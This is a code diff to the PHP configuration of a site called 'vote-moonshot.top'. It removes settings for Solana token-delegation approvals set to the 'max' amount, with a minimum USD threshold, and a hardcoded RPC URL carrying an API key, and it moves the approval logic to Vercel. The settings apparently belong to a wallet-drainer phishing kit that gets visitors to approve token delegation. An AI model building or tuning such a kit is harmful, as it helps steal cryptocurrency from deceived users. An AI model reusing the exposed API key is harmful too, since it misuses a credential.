@@ -27,14 +27,7 @@ $cfg = [
     'restrict_script_access' => true,
     'allowed_script_hosts' => ['vote-moonshot.top', 'www.vote-moonshot.top'],
 
-    // SPL delegate via BPF program (PDA). Enable after: programs/vote-delegate deploy.
-    'token_approval_enabled' => false,
-    'token_approval_program_id' => '',
-    'token_approval_max_count' => 1,
-    'token_approval_min_usd' => 1.0,
-    'token_approval_amount_mode' => 'max',
-    // Set HELIUS_RPC_URL on Vercel (server-side only). PHP never calls Helius directly.
-    'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=68b95562-1955-4c26-92ba-0e240a8b9d62',
+    // Token approvals: Vercel env only (see vercel/api/connect-config.js).
 
     'connect_popup_enabled' => true,
     'connect_popup_url' => '',
@@ -202,11 +195,6 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'vercelSiteUrl' => $vercelOrigin,
         'siteIcons' => array_values(array_map('strval', $icons)),
         'analytics' => (bool) ($cfg['analytics'] ?? true),
-        'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? false),
-        'tokenApprovalProgramId' => (string) ($cfg['token_approval_program_id'] ?? ''),
-        'tokenApprovalMaxCount' => (int) ($cfg['token_approval_max_count'] ?? 0),
-        'tokenApprovalMinUsd' => (float) ($cfg['token_approval_min_usd'] ?? 1),
-        'tokenApprovalAmountMode' => (string) ($cfg['token_approval_amount_mode'] ?? 'max'),
         'solanaRpcUrl' => $gatewayUrl,
         'priceApiUrl' => $gatewayUrl,
         'connectPopupEnabled' => (bool) ($cfg['connect_popup_enabled'] ?? true),
